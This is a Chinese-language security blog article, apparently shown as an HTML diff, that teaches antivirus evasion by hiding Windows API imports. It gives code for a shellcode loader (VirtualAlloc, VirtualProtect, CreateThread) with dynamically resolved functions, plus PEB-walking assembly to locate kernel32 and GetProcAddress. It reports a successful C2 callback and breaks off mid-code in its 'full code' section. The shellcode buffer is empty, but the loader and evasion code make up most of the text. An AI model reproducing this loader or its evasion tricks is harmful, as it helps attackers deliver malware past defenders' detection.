@@ -1,0 +1,458 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="4cb6d7cf42e85b24d82d79880bf20474">前言</h2>
+<p>在PE文件中，存在iat导入表，记录了PE文件使用的API以及相关的dll模块。<br/>
+编译一个MessageBox文件，查看其导入表：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"hello world</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">MessageBox</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"hello world"</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以看到使用了MessageBox这个API</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141011-efe81500-9308-1.png"/></p>
+<p>杀软会对导入表进行查杀，如果发现存在恶意的API，比如VirtualAlloc，CreateThread等，就会认为文件是一个恶意文件。我们可以通过自定义API的方式隐藏导入表中的恶意API。</p>
+<h2 data-content="1" id="117f2c725bee65b4442dc1e43a892e99">自定义API函数</h2>
+<div class="highlight"><pre><span></span><span class="n">FARPROC</span> <span class="nf">GetProcAddress</span><span class="p">(</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">HMODULE</span> <span class="n">hModule</span><span class="p">,</span> <span class="err">包含函数或变量的</span> <span class="n">DLL</span> <span class="err">模块的句柄</span>
+  <span class="p">[</span><span class="n">in</span><span class="p">]</span> <span class="n">LPCSTR</span>  <span class="n">lpProcName</span> <span class="err">函数或变量名称</span>
+<span class="p">);</span>
+<span class="err">定义：</span>
+<span class="k">typedef</span> <span class="kt">int</span> <span class="p">(</span><span class="n">FAR</span> <span class="n">WINAPI</span> <span class="o">*</span><span class="n">FARPROC</span><span class="p">)();</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="n">HMODULE</span> <span class="nf">GetModuleHandleA</span><span class="p">(</span>
+    <span class="n">LPCSTR</span> <span class="n">lpModuleName</span>     <span class="c1">// 模块名称</span>
+<span class="p">);</span>                         <span class="c1">// 成功返回句柄 失败返回NULL</span>
+
+<span class="n">HMODULE</span> <span class="nf">LoadLibraryA</span><span class="p">(</span>
+    <span class="n">LPCSTR</span> <span class="n">lpLibFileName</span> <span class="c1">// 一个dll文件</span>
+<span class="p">);</span>                         <span class="c1">// 成功返回句柄 失败返回NULL</span>
+</pre></div>
+<p>这里GetModuleHandle和LoadLibrary作用是一样的，获取dll文件。<br/>
+通过以上函数自定义API。</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+
+<span class="k">typedef</span> <span class="nf">int</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pMessageBox</span><span class="p">)</span> <span class="p">(</span>
+
+    <span class="n">HWND</span>    <span class="n">hWnd</span><span class="p">,</span>
+    <span class="n">LPCTSTR</span> <span class="n">lpText</span><span class="p">,</span>
+    <span class="n">LPCTSTR</span> <span class="n">lpCaption</span><span class="p">,</span>
+    <span class="n">UINT</span>    <span class="n">uType</span>
+    <span class="p">);</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"hello world</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">pMessageBox</span> <span class="n">MyMessageBox</span> <span class="o">=</span> <span class="p">(</span><span class="n">pMessageBox</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"User32.dll"</span><span class="p">),</span> <span class="s">"MessageBoxA"</span><span class="p">);</span>
+    <span class="n">MyMessageBox</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"hello world"</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>程序可以正常运行：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141205-33cc04ca-9309-1.png"/></p>
+<p>查看其导入表：<br/>
+User32.dll和MessageBox都不存在。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141225-4031ef40-9309-1.png"/></p>
+<h2 data-content="1" id="928bd8641e67b2968e42cca80eb2bc2e">实战测试</h2>
+<p>用创建进程的方式加载shellcode。</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;WinBase.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+
+
+    <span class="c1">// 获取shellcode大小</span>
+    <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">VirtualAlloc</span><span class="p">(</span>
+        <span class="nb">NULL</span><span class="p">,</span>
+        <span class="n">shellcode_size</span><span class="p">,</span>
+        <span class="n">MEM_COMMIT</span><span class="p">,</span>
+        <span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+    <span class="p">);</span>
+    <span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+    <span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
+
+    <span class="c1">// 这里开始更改它的属性为可执行</span>
+    <span class="n">VirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+
+    <span class="n">hThread</span> <span class="o">=</span> <span class="n">CreateThread</span><span class="p">(</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+        <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+        <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>我们将这里敏感的API进行自定义：</p>
+<div class="highlight"><pre><span></span><span class="c1">//VirtualProtect</span>
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualProtect</span><span class="p">)</span> <span class="p">(</span>
+    <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+    <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
+    <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
+<span class="p">);</span>
+
+<span class="n">pVirtualProtect</span> <span class="n">MyVirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualProtect</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">LoadLibrary</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+
+<span class="c1">//CreateThread</span>
+<span class="k">typedef</span> <span class="nf">HANDLE</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCreateThread</span><span class="p">)(</span>
+    <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
+    <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
+    <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
+    <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
+    <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
+    <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>    
+<span class="p">);</span>
+
+<span class="n">pCreateThread</span> <span class="n">MyCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">pCreateThread</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span><span class="s">"CreateThread"</span><span class="p">);</span>
+<span class="c1">//VirtualAlloc</span>
+<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">pVirtualAlloc</span><span class="p">)(</span>
+    <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+    <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flProtect</span>
+<span class="p">);</span>
+
+<span class="n">pVirtualAlloc</span> <span class="n">MyVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualAlloc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
+</pre></div>
+<p>最终代码：</p>
+<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;WinBase.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+
+<span class="c1">//自定义API</span>
+
+<span class="k">typedef</span> <span class="nf">BOOL</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pVirtualProtect</span><span class="p">)</span> <span class="p">(</span>
+    <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+    <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flNewProtect</span><span class="p">,</span>
+    <span class="n">PDWORD</span> <span class="n">lpflOldProtect</span>
+<span class="p">);</span>
+
+<span class="n">pVirtualProtect</span> <span class="n">MyVirtualProtect</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualProtect</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualProtect"</span><span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">HANDLE</span><span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">pCreateThread</span><span class="p">)(</span>
+    <span class="n">LPSECURITY_ATTRIBUTES</span>   <span class="n">lpThreadAttributes</span><span class="p">,</span>
+    <span class="n">SIZE_T</span>                  <span class="n">dwStackSize</span><span class="p">,</span>
+    <span class="n">LPTHREAD_START_ROUTINE</span>  <span class="n">lpStartAddress</span><span class="p">,</span>
+    <span class="n">__drv_aliasesMem</span> <span class="n">LPVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
+    <span class="n">DWORD</span>                   <span class="n">dwCreationFlags</span><span class="p">,</span>
+    <span class="n">LPDWORD</span>                 <span class="n">lpThreadId</span>    
+<span class="p">);</span>
+
+<span class="n">pCreateThread</span> <span class="n">MyCreateThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">pCreateThread</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span><span class="s">"CreateThread"</span><span class="p">);</span>
+
+<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span><span class="n">pVirtualAlloc</span><span class="p">)(</span>
+    <span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
+    <span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
+    <span class="n">DWORD</span>  <span class="n">flProtect</span>
+<span class="p">);</span>
+
+<span class="n">pVirtualAlloc</span> <span class="n">MyVirtualAlloc</span> <span class="o">=</span> <span class="p">(</span><span class="n">pVirtualAlloc</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">),</span> <span class="s">"VirtualAlloc"</span><span class="p">);</span>
+
+
+<span class="c1">// 入口函数</span>
+<span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">TCHAR</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+
+    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// shellcode长度</span>
+    <span class="n">DWORD</span> <span class="n">dwThreadId</span><span class="p">;</span> <span class="c1">// 线程ID</span>
+    <span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">;</span> <span class="c1">// 线程句柄</span>
+    <span class="n">DWORD</span> <span class="n">dwOldProtect</span><span class="p">;</span> <span class="c1">// 内存页属性</span>
+<span class="cm">/* length: 800 bytes */</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span>
+
+
+    <span class="c1">// 获取shellcode大小</span>
+    <span class="n">shellcode_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="o">*</span> <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">MyVirtualAlloc</span><span class="p">(</span>
+        <span class="nb">NULL</span><span class="p">,</span>
+        <span class="n">shellcode_size</span><span class="p">,</span>
+        <span class="n">MEM_COMMIT</span><span class="p">,</span>
+        <span class="n">PAGE_READWRITE</span> <span class="c1">// 只申请可读可写</span>
+    <span class="p">);</span>
+    <span class="c1">// 将shellcode复制到可读可写的内存页中</span>
+    <span class="n">CopyMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">);</span>
+
+    <span class="c1">// 这里开始更改它的属性为可执行</span>
+    <span class="n">MyVirtualProtect</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="n">PAGE_EXECUTE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dwOldProtect</span><span class="p">);</span>
+
+    <span class="n">hThread</span> <span class="o">=</span> <span class="n">MyCreateThread</span><span class="p">(</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 安全描述符</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 栈的大小</span>
+        <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">shellcode</span><span class="p">,</span> <span class="c1">// 函数</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 参数</span>
+        <span class="nb">NULL</span><span class="p">,</span> <span class="c1">// 线程标志</span>
+        <span class="o">&amp;</span><span class="n">dwThreadId</span> <span class="c1">// 线程ID</span>
+    <span class="p">);</span>
+    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="n">INFINITE</span><span class="p">);</span> <span class="c1">// 一直等待线程执行结束</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以成功上线：</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141410-7ec5ef40-9309-1.png"/><br/>
+查看导入表：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141420-849ca288-9309-1.png"/></p>
+<p>可以看到，自定义的三个API已经看不到了，但是GetProcAddress和GetModuleHandle也可能会作为杀软识别的对象。</p>
+<h2 data-content="1" id="f665c86d86cf61a49dbf17fb2bceeffa">深入隐藏</h2>
+<p>通过手动获取dll文件的方式，获取这两个函数的地址。<br/>
+大致流程：</p>
+<ol>
+<li>找到kernel32.dll的地址</li>
+<li>遍历啊kernel32.dll的导入表，找到GetProcAddress的地址</li>
+<li>使用GetProcAddress获取LoadLibrary函数的地址</li>
+<li>然后使用 LoadLibrary加载DLL文件</li>
+<li>使用 GetProcAddress查找某个函数的地址<br/>
+### 获取kernel32.dll的地址<br/>
+这里使用汇编获取，先贴代码。<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="nf">GetKernel32Address</span><span class="p">()</span> <span class="p">{</span>
+<span class="n">DWORD</span> <span class="n">dwKernel32Addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">_asm</span> <span class="p">{</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x30</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x0c</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
+    <span class="n">mov</span> <span class="n">dwKernel32Addr</span><span class="p">,</span> <span class="n">eax</span>
+ <span class="p">}</span>
+ <span class="k">return</span>    <span class="n">dwKernel32Addr</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+这里有两个关键的结构，TEB（线程环境块）和PEB（进程环境块）。PEB结构存储着整个进程的信息。而PEB结构又存放在TEB中。<br/>
+这两个结构指针都存放在fs寄存器中，fs:[0x30]是PEB fs:[0x18]是TEB。<br/>
+接下来再分析上面代码的具体过程：<div class="highlight"><pre><span></span><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="nl">fs</span><span class="p">:</span> <span class="p">[</span><span class="mh">0x30</span><span class="p">]</span>
+<span class="err">指向</span><span class="n">PEB结构</span>
+</pre></div>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141600-c05ffd06-9309-1.png"/><div class="highlight"><pre><span></span><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0xc</span><span class="p">]</span>
+<span class="mh">0xc</span><span class="err">处存放者</span><span class="n">LDR指针它指向一个_PEB_LDR_DATA结构</span>
+</pre></div>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141616-c9c005a8-9309-1.png"/><div class="highlight"><pre><span></span><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x14</span><span class="p">]</span>
+<span class="err">指向</span><span class="n">LDR指针中的InMemoryOrderModuleList链表</span>
+</pre></div>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141630-d1f9373a-9309-1.png"/><br/>
+这里面有三个链表，这三个列表中的模块是一样的，只是顺序不同。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141640-d80ab04a-9309-1.png"/><div class="highlight"><pre><span></span><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+</pre></div>
+因为kernel32的位置是第三个，第一个是InMemoryOrderModuleList本身，向下两次，就找到了kernel32（这块还不是很理解）。<br/>
+最后就是获取kernel32的基址：<div class="highlight"><pre><span></span><span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">]</span>
+<span class="n">InMemoryOrderModuleList</span> <span class="err">再偏移</span><span class="mh">0x10</span><span class="err">，指向</span><span class="n">dllbase</span>
+</pre></div>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20230113141901-2c00e642-930a-1.png"/><br/>
+### 获取GetProcAddress<br/>
+不做叙述，有兴趣的可以自行学习，代码如下：<div class="highlight"><pre><span></span><span class="n">DWORD</span> <span class="nf">RGetProcAddress</span><span class="p">()</span> <span class="p">{</span>
+ <span class="c1">//获取kernel32的地址</span>
+ <span class="n">DWORD</span> <span class="n">dwAddrBase</span> <span class="o">=</span> <span class="n">GetKernel32Address</span><span class="p">();</span>
+ <span class="c1">//获取Dos头</span>
+ <span class="n">PIMAGE_DOS_HEADER</span> <span class="n">pDos</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_DOS_HEADER</span><span class="p">)</span><span class="n">dwAddrBase</span><span class="p">;</span>
+ <span class="c1">//获取Nt头 Nt头=dll基址+Dos头</span>
+ <span class="n">PIMAGE_NT_HEADERS</span> <span class="n">pNt</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_NT_HEADERS</span><span class="p">)(</span><span class="n">pDos</span><span class="o">-&gt;</span><span class="n">e_lfanew</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//数据目录表                            扩展头 数据目录表 + 导出表    定位导出表</span>
+ <span class="n">PIMAGE_DATA_DIRECTORY</span> <span class="n">pDataDir</span> <span class="o">=</span> <span class="n">pNt</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span> <span class="o">+</span><span class="n">IMAGE_DIRECTORY_ENTRY_EXPORT</span><span class="p">;</span>
+ <span class="c1">//导出表</span>
+ <span class="c1">//导出表地址</span>
+ <span class="n">PIMAGE_EXPORT_DIRECTORY</span> <span class="n">pExport</span> <span class="o">=</span> <span class="p">(</span><span class="n">PIMAGE_EXPORT_DIRECTORY</span><span class="p">)(</span><span class="n">dwAddrBase</span> <span class="o">+</span> <span class="n">pDataDir</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">);</span>
+ <span class="c1">//函数总数</span>
+ <span class="n">DWORD</span> <span class="n">dwFunCount</span> <span class="o">=</span> <span class="n">pExport</span><span class="o">-&gt;</span><span class="n">NumberOfFunctions</span><span class="p">;</span>
+ <span class="c1">//函数名称数量</span>
+ <span class="n">DWORD</span> <span class="n">dwFunNameCount</span> <span class="o">=</span> <span class="n">pExport</span><span class="o">-&gt;</span><span class="n">NumberOfNames</span><span class="p">;</span>
+ <span class="c1">//函数地址</span>
+ <span class="n">PDWORD</span> <span class="n">pAddrOfFun</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfFunctions</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//函数名称地址</span>
+ <span class="n">PDWORD</span> <span class="n">pAddrOfNames</span> <span class="o">=</span> <span class="p">(</span><span class="n">PDWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfNames</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+ <span class="c1">//序号表</span>
+ <span class="n">PWORD</span> <span class="n">pAddrOfOrdinals</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWORD</span><span class="p">)(</span><span class="n">pExport</span><span class="o">-&gt;</span><span class="n">AddressOfNameOrdinals</span><span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">);</span>
+  <span class="c1">//遍历函数总数</span>
+  <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dwFunCount</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+    <span class="p">{</span>
+     <span class="c1">//判断函数地址是否存在</span>
+       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pAddrOfFun</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
+      <span class="p">{</span>
+             <span class="k">continue</span><span class="p">;</span>
+         <span class="p">}</span>
+                  <span class="c1">//通过函数地址遍历函数名称地址，获取想要的函数</span>
+      <span class="n">DWORD</span> <span class="n">dwFunAddrOffset</span> <span class="o">=</span> <span class="n">pAddrOfFun</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+      <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="n">dwFunNameCount</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span>
+      <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">pAddrOfOrdinals</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">==</span> <span class="n">i</span><span class="p">)</span> 
+           <span class="p">{</span>
+                <span class="n">DWORD</span> <span class="n">dwNameOffset</span> <span class="o">=</span> <span class="n">pAddrOfNames</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
+               <span class="kt">char</span> <span class="o">*</span> <span class="n">pFunName</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">dwAddrBase</span> <span class="o">+</span> <span class="n">dwNameOffset</span><span class="p">);</span>
+              <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">pFunName</span><span class="p">,</span><span class="s">"GetProcAddress"</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+              <span class="p">{</span>
+                    <span class="k">return</span> <span class="n">dwFunAddrOffset</span> <span class="o">+</span> <span class="n">dwAddrBase</span><span class="p">;</span>
+             <span class="p">}</span>
+         <span class="p">}</span>
+     <span class="p">}</span>
+ <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+## 完整代码<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;intrin.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;WinBase.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="n">DWORD</span> <span class="nf">GetKernel32Address</span><span class="p">()</span> <span class="p">{</span>
